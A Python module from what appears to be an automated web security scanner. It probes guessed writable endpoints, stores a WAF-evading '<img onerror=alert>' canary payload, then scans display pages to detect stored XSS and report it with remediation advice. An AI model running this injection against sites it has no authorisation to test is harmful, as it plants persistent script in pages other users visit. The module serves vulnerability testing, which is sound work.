"""
pin0ccsAI — Stored XSS Engine

Reflected XSS requires only one request (inject + observe in same response).
Stored XSS requires two requests:
  1. Inject a canary payload into a writable endpoint (POST comment, profile, etc.)
  2. Retrieve the page where that content is displayed and look for the canary

This module implements that two-phase pattern.

Design decisions:
  - Canary is unique per target+session to avoid cross-test false positives
  - Canary is a short JS snippet that avoids common WAF trigger words
  - Retrieve phase checks multiple "reflection pages" for each injection point
  - Results are Finding objects at confidence=0.70 (still requires Debator)
  - Auth session is passed in — most stored XSS requires authenticated context
"""
from __future__ import annotations

import asyncio
import re
import secrets
from typing import Optional

import httpx

from core.logger import get_logger
from core.models import Endpoint, Finding, ReconResult, Severity, VulnType

log = get_logger(__name__)

# Canary template — unique marker, low WAF entropy
# {token} is replaced with a random 8-char hex string per test
_CANARY_TEMPLATE = "<img src=x id=pin0cc_{token} onerror=alert('{token}')>"

# Pages commonly used to reflect stored content
_COMMON_REFLECTION_PATHS = [
    "/",
    "/profile", "/account", "/settings",
    "/dashboard", "/admin",
    "/comments", "/posts", "/messages",
    "/feed", "/news", "/blog",
    "/users/{id}", "/user/{id}",
    "/notifications",
]

# Writable endpoint patterns that often store user content
_WRITABLE_PATTERNS = [
    "/comment", "/post", "/message", "/note",
    "/profile", "/account/update", "/settings",
    "/feedback", "/review", "/rating",
    "/api/comment", "/api/post", "/api/message",
    "/api/user", "/api/profile",
]


class StoredXSSEngine:
    """
    Tests for stored XSS by injecting canary payloads and then
    checking a set of retrieval pages for deferred execution.
    """

    def __init__(
        self,
        auth_session=None,
        timeout: int = 10,
        max_endpoints: int = 10,
        max_retrieve_pages: int = 5,
    ):
        self._auth = auth_session
        self._timeout = timeout
        self._max_endpoints = max_endpoints
        self._max_retrieve_pages = max_retrieve_pages

    async def run(
        self,
        recon: ReconResult,
        session_id: str,
    ) -> list[Finding]:
        """
        Full stored XSS scan for all writable endpoints in the recon result.
        Returns list of Finding objects.
        """
        findings: list[Finding] = []
        base_url = recon.target.url.rstrip("/")

        # Identify writable endpoints (POST/PUT endpoints + pattern matching)
        writable = self._identify_writable(recon)
        log.info("stored_xss.start",
                 writable_endpoints=len(writable), base=base_url)

        # Build retrieval page list (pages that display user content)
        retrieve_pages = self._build_retrieve_pages(base_url, recon)

        # Test each writable endpoint
        for endpoint in writable[:self._max_endpoints]:
            canary_findings = await self._test_endpoint(
                endpoint=endpoint,
                base_url=base_url,
                retrieve_pages=retrieve_pages,
            )
            findings.extend(canary_findings)

        log.info("stored_xss.complete", findings=len(findings))
        return findings

    # ─── Endpoint Identification ──────────────────────────────────────────────

    def _identify_writable(self, recon: ReconResult) -> list[Endpoint]:
        """
        Find endpoints likely to accept and store user-supplied content.
        Criteria:
          1. POST/PUT/PATCH method endpoints
          2. URL path contains a writable pattern keyword
          3. Content-type suggests form or JSON input
        """
        writable: list[Endpoint] = []

        for ep in recon.endpoints:
            is_writable_method = ep.method.upper() in ("POST", "PUT", "PATCH")
            is_writable_path = any(
                pat in ep.url.lower() for pat in _WRITABLE_PATTERNS
            )
            is_writable_content = any(
                ct in ep.content_type.lower()
                for ct in ["form", "json", "multipart"]
            )

            if is_writable_method or is_writable_path or is_writable_content:
                writable.append(ep)

        # Also add pattern-matched paths that weren't in endpoint list
        base = recon.target.url.rstrip("/")
        known_urls = {ep.url for ep in writable}
        for path in _WRITABLE_PATTERNS:
            candidate = base + path
            if candidate not in known_urls:
                writable.append(Endpoint(url=candidate, method="POST"))

        return writable

    def _build_retrieve_pages(
        self, base_url: str, recon: ReconResult
    ) -> list[str]:
        """
        Build list of pages to check after injection.
        Combines: common reflection paths + discovered endpoints
        that look like content display pages.
        """
        pages: list[str] = []

        # Common reflection paths
        for path in _COMMON_REFLECTION_PATHS:
            pages.append(base_url + path)

        # Discovered endpoints that display content (GET + no query params)
        for ep in recon.endpoints:
            if ep.method.upper() == "GET" and "?" not in ep.url:
                if any(kw in ep.url.lower() for kw in
                       ["profile", "dashboard", "feed", "comment",
                        "post", "blog", "news", "user", "account"]):
                    pages.append(ep.url)

        # GraphQL endpoints — introspection + queries
        pages.extend(recon.graphql_endpoints)

        return list(dict.fromkeys(pages))  # deduplicate preserving order

    # ─── Injection and Retrieval ──────────────────────────────────────────────

    async def _test_endpoint(
        self,
        endpoint: Endpoint,
        base_url: str,
        retrieve_pages: list[str],
    ) -> list[Finding]:
        """
        Test one writable endpoint for stored XSS.
        Returns findings if canary is found on any retrieval page.
        """
        token = secrets.token_hex(4)          # e.g. "a3f1c9b2"
        canary = _CANARY_TEMPLATE.format(token=token)
        canary_id = f"pin0cc_{token}"         # unique DOM id to search for

        client_kwargs = {"timeout": self._timeout, "verify": False,
                         "follow_redirects": True}
        if self._auth and self._auth.is_authenticated:
            client_kwargs.update(self._auth.build_client_kwargs())

        findings: list[Finding] = []

        async with httpx.AsyncClient(**client_kwargs) as client:
            # Phase 1: Inject
            injected = await self._inject(client, endpoint, canary)
            if not injected:
                return []

            log.debug("stored_xss.injected",
                      url=endpoint.url, token=token)

            # Small delay — let the server process the stored content
            await asyncio.sleep(0.5)

            # Phase 2: Retrieve and search
            for page in retrieve_pages[:self._max_retrieve_pages]:
                found = await self._retrieve_and_check(
                    client, page, canary_id, canary
                )
                if found:
                    evidence = f"Canary '{canary_id}' found at {page} after injection to {endpoint.url}"
                    findings.append(Finding(
                        title=f"Stored XSS — injected via {endpoint.url}, reflected at {page}",
                        vuln_type=VulnType.XSS_STORED,
                        severity=Severity.HIGH,
                        url=base_url,
                        endpoint=endpoint.url,
                        method=endpoint.method,
                        parameter="(body — see steps)",
                        payload=canary,
                        evidence=evidence,
                        steps_to_reproduce=[
                            f"1. Authenticate to {base_url}",
                            f"2. {endpoint.method} {endpoint.url}",
                            f"   Include in body/field: {canary}",
                            f"3. Navigate to: {page}",
                            f"4. Observe '{canary_id}' in DOM — XSS executes on page load",
                        ],
                        impact=(
                            "Persistent JavaScript execution in any user's browser "
                            "that views the affected page. Can be used for session "
                            "hijacking, credential theft, or further exploitation."
                        ),
                        remediation=(
                            "HTML-encode all user-supplied content before rendering. "
                            "Implement a Content Security Policy. "
                            "Use context-aware output encoding."
                        ),
                        tool="stored_xss_engine",
                        confidence=0.70,
                    ))
                    # One finding per injection point is sufficient
                    break

        return findings

    async def _inject(
        self,
        client: httpx.AsyncClient,
        endpoint: Endpoint,
        canary: str,
    ) -> bool:
        """
        Attempt to inject the canary into the endpoint.
        Tries JSON body first, then form data, then query parameter.
        Returns True if the server accepted the request (2xx or 3xx).
        """
        url = endpoint.url

        # Common field names for user-supplied text content
        field_names = ["content", "body", "message", "text", "comment",
                       "description", "note", "value", "data", "title", "name"]

        # Try JSON body
        for field in field_names[:3]:
            try:
                resp = await client.post(
                    url,
                    json={field: canary},
                    headers={"Content-Type": "application/json"},
                )
                if resp.status_code < 400:
                    return True
            except Exception:
                pass

        # Try form data
        for field in field_names[:3]:
            try:
                resp = await client.post(url, data={field: canary})
                if resp.status_code < 400:
                    return True
            except Exception:
                pass

        # Try GET with query param (some endpoints store query values)
        try:
            resp = await client.get(url, params={"q": canary})
            if resp.status_code < 400:
                return True
        except Exception:
            pass

        return False

    async def _retrieve_and_check(
        self,
        client: httpx.AsyncClient,
        url: str,
        canary_id: str,
        canary_payload: str,
    ) -> bool:
        """
        Fetch a retrieval page and check for canary presence.
        Returns True if canary is found.
        """
        try:
            resp = await client.get(url)
            if resp.status_code >= 400:
                return False
            body = resp.text
            # Check for the unique canary ID in the DOM
            # This is more specific than checking the full payload
            if canary_id in body:
                log.debug("stored_xss.canary_found",
                          retrieve_url=url, canary_id=canary_id)
                return True
        except Exception:
            pass
        return False
